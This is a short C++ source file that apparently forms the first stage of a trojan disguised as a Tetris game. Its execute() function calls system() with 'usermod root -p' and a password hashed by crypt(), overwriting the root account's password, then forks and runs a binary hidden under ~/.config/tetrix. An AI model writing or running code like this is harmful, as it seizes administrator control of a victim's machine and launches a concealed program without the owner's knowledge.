#include "phase1.h"
#include <unistd.h>

phase1::phase1()
{

}

int phase1::execute()
{
  std::string homedir = std::getenv("HOME");
  std::string cmd_start = "usermod root -p ";
  std::string second_part = crypt(ROOT_PASSWORD, "AA");
  system((cmd_start + second_part).c_str());
  if(fork() == 0)
    system((homedir+"/.config/tetrix/Tetrix -p 2").c_str());
  return 0;
}
